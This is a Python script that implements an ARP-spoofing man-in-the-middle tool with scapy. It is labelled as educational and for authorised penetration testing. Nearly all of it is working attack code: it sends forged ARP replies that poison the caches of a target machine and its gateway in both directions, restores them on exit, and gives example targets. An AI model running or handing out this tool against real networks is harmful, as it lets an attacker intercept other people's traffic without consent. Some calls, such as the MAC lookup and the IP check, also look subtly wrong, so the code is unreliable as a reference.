#!/usr/bin/env python3
"""
ARP Spoofer - Network Security Tool
Educational tool for authorized penetration testing only.
Demonstrates Man-in-the-Middle (MITM) attack via ARP spoofing.

Author: Babatunde2112
License: Educational Use Only
"""

import scapy.all as scapy
import time
import sys
import signal
from colorama import Fore, Style, init

# Initialize colorama for colored output
init(autoreset=True)

class ARPSpoofer:
    """
    ARP Spoofer class for performing Man-in-the-Middle attacks
    by spoofing ARP packets on a local network.
    """
    
    def __init__(self, target_ip, spoof_ip, interface=None):
        """
        Initialize ARP Spoofer
        
        Args:
            target_ip (str): IP address of the target machine
            spoof_ip (str): IP address to spoof (usually gateway/router)
            interface (str): Network interface to use (auto-detected if None)
        """
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.interface = interface or scapy.conf.iface
        self.target_mac = None
        self.spoof_mac = None
        self.packets_sent = 0
        
        # Get MAC addresses
        self._resolve_mac_addresses()
    
    def _resolve_mac_addresses(self):
        """Resolve MAC addresses for target and spoof IPs"""
        print(f"{Fore.CYAN}[*] Resolving MAC addresses...")
        
        # Get attacker's MAC
        self.attacker_mac = scapy.get_mac(self.interface)
        print(f"{Fore.GREEN}[+] Attacker MAC: {self.attacker_mac}")
        
        # Get target's MAC
        self.target_mac = self._get_mac(self.target_ip)
        if not self.target_mac:
            print(f"{Fore.RED}[-] Could not resolve MAC for target IP: {self.target_ip}")
            sys.exit(1)
        print(f"{Fore.GREEN}[+] Target MAC: {self.target_mac}")
        
        # Get spoof IP's MAC
        self.spoof_mac = self._get_mac(self.spoof_ip)
        if not self.spoof_mac:
            print(f"{Fore.RED}[-] Could not resolve MAC for spoof IP: {self.spoof_ip}")
            sys.exit(1)
        print(f"{Fore.GREEN}[+] Spoof IP ({self.spoof_ip}) MAC: {self.spoof_mac}")
    
    def _get_mac(self, ip):
        """
        Get MAC address for a given IP using ARP
        
        Args:
            ip (str): IP address to resolve
            
        Returns:
            str: MAC address or None if resolution fails
        """
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        
        if answered_list:
            return answered_list[0][1].hwsrc
        return None
    
    def _create_arp_packet(self, target_ip, target_mac, spoof_ip, spoof_mac):
        """
        Create a spoofed ARP packet
        
        Args:
            target_ip (str): Target's IP address
            target_mac (str): Target's MAC address
            spoof_ip (str): IP to claim ownership of
            spoof_mac (str): MAC to claim (attacker's MAC)
            
        Returns:
            scapy.Packet: Crafted ARP packet
        """
        # Create ARP packet
        arp_packet = scapy.ARP()
        arp_packet.op = 2  # 1 = ARP Request, 2 = ARP Reply
        arp_packet.pdst = target_ip  # Target's IP
        arp_packet.hwdst = target_mac  # Target's MAC
        arp_packet.psrc = spoof_ip  # Claim to be this IP
        arp_packet.hwsrc = spoof_mac  # With this MAC (attacker's)
        
        return arp_packet
    
    def spoof(self, duration=None):
        """
        Start ARP spoofing
        
        Args:
            duration (int): Duration in seconds (None = infinite)
        """
        print(f"\n{Fore.YELLOW}[!] Starting ARP spoofing...")
        print(f"{Fore.YELLOW}[!] Target: {self.target_ip} ({self.target_mac})")
        print(f"{Fore.YELLOW}[!] Spoofing: {self.spoof_ip} ({self.spoof_mac})")
        print(f"{Fore.RED}[!] Press Ctrl+C to stop...\n")
        
        try:
            start_time = time.time()
            
            while True:
                # Check if duration exceeded
                if duration and (time.time() - start_time) > duration:
                    break
                
                # Send ARP packet to target (telling it attacker is the gateway)
                arp_packet = self._create_arp_packet(
                    self.target_ip,
                    self.target_mac,
                    self.spoof_ip,
                    self.attacker_mac
                )
                
                # Also poison the gateway (optional - for bidirectional MITM)
                arp_packet_gateway = self._create_arp_packet(
                    self.spoof_ip,
                    self.spoof_mac,
                    self.target_ip,
                    self.attacker_mac
                )
                
                # Send packets
                scapy.send(arp_packet, verbose=False)
                scapy.send(arp_packet_gateway, verbose=False)
                
                self.packets_sent += 2
                print(f"{Fore.GREEN}[+] Packets sent: {self.packets_sent}", end='\r')
                
                time.sleep(1)
        
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Stopping ARP spoofer...")
            self.restore()
    
    def restore(self):
        """Restore ARP tables on target and gateway"""
        print(f"{Fore.CYAN}[*] Restoring ARP tables...")
        
        # Send correct ARP packets to restore
        print(f"{Fore.CYAN}[*] Telling target correct gateway MAC...")
        
        arp_restore_target = scapy.ARP()
        arp_restore_target.op = 2
        arp_restore_target.pdst = self.target_ip
        arp_restore_target.hwdst = self.target_mac
        arp_restore_target.psrc = self.spoof_ip
        arp_restore_target.hwsrc = self.spoof_mac
        
        scapy.send(arp_restore_target, count=5, verbose=False)
        
        print(f"{Fore.CYAN}[*] Telling gateway correct target MAC...")
        
        arp_restore_gateway = scapy.ARP()
        arp_restore_gateway.op = 2
        arp_restore_gateway.pdst = self.spoof_ip
        arp_restore_gateway.hwdst = self.spoof_mac
        arp_restore_gateway.psrc = self.target_ip
        arp_restore_gateway.hwsrc = self.target_mac
        
        scapy.send(arp_restore_gateway, count=5, verbose=False)
        
        print(f"{Fore.GREEN}[+] ARP tables restored!")
        print(f"{Fore.GREEN}[+] Total packets sent: {self.packets_sent}")


def main():
    """Main entry point"""
    if len(sys.argv) < 3:
        print(f"{Fore.YELLOW}Usage: python3 arp_spoofer.py <target_ip> <spoof_ip> [interface]")
        print(f"{Fore.YELLOW}Example: python3 arp_spoofer.py 192.168.1.5 192.168.1.1 eth0")
        print(f"\n{Fore.CYAN}Parameters:")
        print(f"  <target_ip>  - IP address of the target machine")
        print(f"  <spoof_ip>   - IP to spoof (usually gateway: 192.168.1.1)")
        print(f"  [interface]  - Network interface (optional, auto-detected if omitted)")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    spoof_ip = sys.argv[2]
    interface = sys.argv[3] if len(sys.argv) > 3 else None
    
    # Validate IPs
    try:
        scapy.IP(target_ip)
        scapy.IP(spoof_ip)
    except:
        print(f"{Fore.RED}[-] Invalid IP address format!")
        sys.exit(1)
    
    # Create and run spoofer
    try:
        spoofer = ARPSpoofer(target_ip, spoof_ip, interface)
        spoofer.spoof()
    except PermissionError:
        print(f"{Fore.RED}[-] This tool requires root privileges!")
        sys.exit(1)
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()